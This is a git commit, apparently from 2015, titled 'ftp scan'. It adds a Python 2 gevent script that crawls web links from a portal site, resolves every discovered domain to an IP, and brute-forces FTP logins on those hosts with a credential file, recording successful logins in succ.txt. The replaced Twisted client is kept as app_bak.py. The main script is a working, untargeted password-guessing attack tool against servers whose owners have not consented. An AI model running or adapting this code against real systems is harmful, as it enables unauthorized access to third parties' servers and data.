71e80c72859c1b7e71f52b22aee6fdee6d4845f1
mfl <mfl@mfl.mm>
2015-09-28 00:42:54 +0800

    ftp scan

--- app.py
+++ app.py
@@ -1,24 +1,83 @@
-from twisted.internet import reactor
-from twisted.internet.protocol import Protocol
-from twisted.internet.endpoints import TCP4ClientEndpoint, connectProtocol
-from twisted.protocols.ftp import FTPClient
-host='59.66.193.197'
-port=8080
+#!/usr/bin/env python
+import ftplib
+import re
+import socket
+import urllib2
+import gevent
+from gevent import monkey
+from gevent import queue
+monkey.patch_all()
 
-class Greeter(Protocol):
-    def sendMessage(self, msg):
-        self.transport.write("MESSAGE %s\n" % msg)
-    def dataReceived(self,data):
-        log=open('log','w+')
-        log.write(data)
-        log.close()
 
-def gotProtocol(p):
-    p.sendMessage("Hello")
-    reactor.callLater(1, p.sendMessage, "This is sent in a second")
-    reactor.callLater(2, p.transport.loseConnection)
+passwdFile = 'userpass.txt'
+hosts = queue.Queue()
+hostpool=queue.Queue()
+hostset=set()
+hostset1=set()
+hostpool.put("http://www.hao123.com/")
+hostset1.add("http://www.hao123.com/")
+def bruteLogin(dic):
+    while True:
+        if hosts.empty():
+#            print 'hosts empty'
+            gevent.sleep(0)
+            continue
+        hostname=hosts.get()
+        print hostname
+        
+        for userName in dic.keys():
+            passWord=dic[userName]
+            print "[+] Trying: "+userName+"/"+passWord
+            try:
+                with gevent.Timeout(2, False) as timeout:
+                    ftp = ftplib.FTP(hostname)
+                    ftp.login(userName, passWord)
+                    print '\n[*] ' + str(hostname) +' FTP Logon Succeeded: '+userName+"/"+passWord
+                    succ=open('succ.txt','w+')
+                    succ.write('\n[*] ' + str(hostname) +' FTP Logon Succeeded: '+userName+"/"+passWord)
+                    succ.close()
+                    ftp.quit()
+            except Exception, e:
+                pass
+            print 'login {0} wrong.'.format(hostname)
 
-point = TCP4ClientEndpoint(reactor, host, port)
-d = connectProtocol(point, FTPClient())
-#d.addCallback(gotProtocol)
-reactor.run()
+        
+def scanhost():
+    while True:
+        if hostpool.empty():
+            print 'no host'
+        host=hostpool.get()
+        #connect to a URL
+        print host
+        try:
+            with gevent.Timeout(2, False) as timeout:
+                website = urllib2.urlopen(host)
+        except TypeError,e:
+            print 'urlopen:'+host+str(e)
+
+        #read html code
+        html = website.read()
+        #use re.findall to get all the links
+        links = re.findall('"((http|ftp)?://(.*?(\.net|\.com|\.cn|\.org|\.cc|\.tv|\.tk|\.me)).*?)"', html,re.I)
+
+        for link in links:
+            if link[0] not in hostset1:
+                hostpool.put(link[0])
+                hostset1.add(link[0])
+
+            if link[2] not in hostset:
+                try: 
+                    ip = socket.gethostbyname(link[2]) 
+                except Exception,e:
+                    print 'gethost:'+link[2]+str(e)
+                hosts.put(ip)
+                hostset.add(link[2])
+pF = open(passwdFile, 'r')
+dic={}
+for line in pF.readlines():
+    userName=line.split(':')[0]
+    passWord=line.split(':')[1].strip('\r').strip('\n')
+    dic[userName]=passWord
+bure=gevent.spawn(bruteLogin,dic)
+scan=gevent.spawn(scanhost)
+gevent.joinall((scan,bure))
---
+++ app_bak.py
@@ -0,0 +1,24 @@
+from twisted.internet import reactor
+from twisted.internet.protocol import Protocol
+from twisted.internet.endpoints import TCP4ClientEndpoint, connectProtocol
+from twisted.protocols.ftp import FTPClient
+host='59.66.193.197'
+port=8080
+
+class Greeter(Protocol):
+    def sendMessage(self, msg):
+        self.transport.write("MESSAGE %s\n" % msg)
+    def dataReceived(self,data):
+        log=open('log','w+')
+        log.write(data)
+        log.close()
+
+def gotProtocol(p):
+    p.sendMessage("Hello")
+    reactor.callLater(1, p.sendMessage, "This is sent in a second")
+    reactor.callLater(2, p.transport.loseConnection)
+
+point = TCP4ClientEndpoint(reactor, host, port)
+d = connectProtocol(point, FTPClient())
+#d.addCallback(gotProtocol)
+reactor.run()
